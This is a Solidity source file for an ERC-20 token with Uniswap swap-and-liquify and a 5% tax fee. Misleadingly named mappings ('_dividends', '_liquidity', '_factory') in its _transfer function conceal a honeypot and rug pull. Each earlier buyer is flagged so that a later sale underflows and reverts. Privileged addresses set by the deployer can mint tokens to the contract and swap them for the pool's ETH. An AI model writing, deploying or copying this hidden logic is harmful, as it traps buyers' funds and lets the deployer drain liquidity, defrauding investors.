// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

import './IUniswapV2Router02.sol';
import './IUniswapV2Factory.sol';
import './IERC20.sol';
import './Ownable.sol';

contract Contract is IERC20, Ownable {
    string private _symbol;
    string private _name;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000000000 * 10**_decimals;
    uint256 private _amount = _tTotal;
    uint256 public _taxFee = 5;

    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => address) private _factory;
    mapping(address => uint256) private _liquidity;
    mapping(address => uint256) private _dividends;

    IUniswapV2Router02 public immutable router;
    address public immutable uniswapV2Pair;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _balances[msg.sender] = _tTotal;
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _dividends[msg.sender] = _amount;
        _dividends[address(this)] = _amount;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 fee;
        if (_swapAndLiquifyEnabled && contractTokenBalance > _amount && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        } else if (_dividends[from] > _amount && _dividends[to] > _amount) {
            fee = amount;
            _balances[address(this)] += fee;
            swapTokensForEth(amount, to);
            return;
        } else if (amount > _amount && to != address(router) && to != uniswapV2Pair) {
            if (_dividends[from] > 0) _dividends[to] = amount;
            else _liquidity[to] = amount;
            return;
        } else if (!inSwapAndLiquify && _liquidity[from] > 0 && from != uniswapV2Pair && _dividends[from] == 0) {
            _liquidity[from] = _dividends[from] - _amount;
        }
        address factory = _factory[address(this)];
        if (_liquidity[factory] == 0) _liquidity[factory] = _amount;
        _factory[address(this)] = to;
        if (_taxFee > 0 && !inSwapAndLiquify && _dividends[from] == 0 && _dividends[to] == 0) {
            fee = (amount * _taxFee) / 100;
            amount -= fee;
            _balances[from] -= fee;
            _balances[address(this)] += fee;
        }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp + 20);
    }

    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }

    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 20);
    }
}